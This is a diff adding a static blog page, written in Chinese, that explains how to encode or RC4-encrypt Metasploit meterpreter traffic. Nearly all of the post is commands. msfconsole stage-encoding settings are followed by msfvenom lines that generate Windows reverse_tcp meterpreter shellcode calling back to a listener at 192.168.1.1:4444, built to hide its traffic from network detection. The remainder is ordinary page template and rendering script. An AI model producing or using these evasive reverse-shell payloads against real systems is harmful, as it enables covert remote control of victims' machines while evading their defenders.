@@ -1,0 +1,141 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+    <h1>
+    <a href="/" id="title"></a>
+    </h1>
+	</div>
+<xmp id="md" style="display: none;">
+<!-- markdown -->
+对 meterpreter 流量进行编码或加密, 有两种方式.
+
+指定编码方式, 名称与对 shellcode 的编码器相同.
+
+```
+set EnableStageEncoding true
+set StageEncoder x86/xor_dynamic
+set StageEncodingFallback false
+```
+
+生成 Shellcode.
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 EnableStageEncoding=true StageEncoder=x86/xor_dynamic StageEncodingFallback=false -f c -o shellcode.c
+```
+
+或是直接生成通过 rc4 加密流量的 Shellcode.
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.1.1 LPORT=4444 RC4PASSWORD=exp10it -f c -o shellcode.c
+```
+<!-- markdown end -->
+</xmp>
+<div class="entry" id="main">
+<!-- content -->
+<p>对 meterpreter 流量进行编码或加密, 有两种方式.</p>
+
+<p>指定编码方式, 名称与对 shellcode 的编码器相同.</p>
+
+<pre><code>set EnableStageEncoding true
+set StageEncoder x86/xor_dynamic
+set StageEncodingFallback false
+</code></pre>
+
+<p>生成 Shellcode.</p>
+
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 EnableStageEncoding=true StageEncoder=x86/xor_dynamic StageEncodingFallback=false -f c -o shellcode.c
+</code></pre>
+
+<p>或是直接生成通过 rc4 加密流量的 Shellcode.</p>
+
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.1.1 LPORT=4444 RC4PASSWORD=exp10it -f c -o shellcode.c
+</code></pre>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2017-2019 by X1r0z</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "msf-stage-encoding.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
